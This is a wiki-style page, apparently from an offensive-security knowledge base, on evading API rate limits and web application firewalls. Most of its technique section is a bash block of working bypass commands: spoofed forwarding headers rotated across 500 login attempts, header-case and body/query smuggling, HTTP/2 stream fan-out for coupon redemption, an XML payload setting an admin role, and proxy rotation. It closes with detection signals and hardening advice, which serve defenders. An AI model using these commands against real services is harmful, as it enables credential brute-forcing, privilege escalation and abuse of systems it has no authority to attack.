---
title: API Rate-Limit and WAF Evasion Techniques
slug: api-evasion-techniques
---

> **TL;DR:** Rate limits and WAFs that key on IP, header casing, or content-type fall over to spoofed forwarding headers, HTTP/2 multiplexing, body/query smuggling, and alternate serialisations.

## What it is
Many API gateways enforce limits and signature matching at L7 with incomplete normalisation. Attackers exploit the gap between what the gateway parses and what the origin parses: forwarded-for chains it trusts, header names it treats as case-sensitive, parameters it only reads from the query string, and content types whose parsers it does not own. The techniques below let one client behave like many, or like a different request entirely.

## Preconditions / where it applies
- Target sits behind a CDN, WAF, or API gateway with per-IP throttling
- Origin parses requests with a different library than the edge
- HTTP/2 or HTTP/3 termination at the edge with HTTP/1.1 to origin

## Technique

```bash
# 1. X-Forwarded-For rotation — many gateways key limits off the first hop
for i in $(seq 1 500); do
  ip="10.$((RANDOM%255)).$((RANDOM%255)).$((RANDOM%255))"
  curl -s -o /dev/null -w '%{http_code}\n' \
    -H "X-Forwarded-For: $ip" -H "X-Real-IP: $ip" -H "True-Client-IP: $ip" \
    https://api.target.tld/v1/login -d 'user=a&pass=b'
done

# 2. Header case manipulation — WAF rule matches "Authorization" but origin lowercases
curl -s -H 'AUTHORIZATION: Bearer $T' -H 'authorization: Bearer $T' https://api.target.tld/v1/me

# 3. Body vs query-string smuggling — limit counts ?action=login, body sneaks past
curl -s -X POST 'https://api.target.tld/v1/auth?action=ping' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'action=login&user=a&pass=b'

# 4. HTTP/2 stream multiplexing — one TCP conn, many concurrent streams
nghttp -n -m 100 https://api.target.tld/v1/coupons/redeem -H ':method: POST' \
  -d body.json

# 5. Alternate content-type — WAF JSON rules skip XML / form / msgpack
curl -s -X POST https://api.target.tld/v1/users \
  -H 'Content-Type: application/xml' \
  --data '<user><role>admin</role></user>'

# 6. IP rotation farm via residential proxy pool
curl -s --proxy http://user:pass@rotating.proxy:8000 https://api.target.tld/v1/me
```

Combine: rotate XFF, downgrade content-type, and multiplex over HTTP/2 to defeat a layered ruleset.

## Detection and defence
- Defender signals: bursts where `X-Forwarded-For` is wildly varied but TLS JA3 or HTTP/2 SETTINGS fingerprint is constant; mixed-case headers; unusual content types on auth endpoints; high stream concurrency per connection
- Hardening: rate-limit on authenticated identity (token, account) not IP; canonicalise headers before WAF evaluation; ignore client-supplied forwarded-for unless the immediate peer is a trusted hop; cap concurrent streams per connection; apply the same parsing rules at edge and origin; reject unexpected content types per route with an allowlist

## References
- [PortSwigger HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling) — parser-discrepancy pattern this borrows from
- [Cloudflare True-Client-IP guidance](https://developers.cloudflare.com/fundamentals/reference/http-headers/) — how forwarding headers should be trusted
- [RFC 9113 HTTP/2](https://www.rfc-editor.org/rfc/rfc9113) — stream multiplexing semantics abused for fan-out

See also: [[rate-limit-bypass]], [[api-authentication-attacks]], [[tech-stack-fingerprinting]].
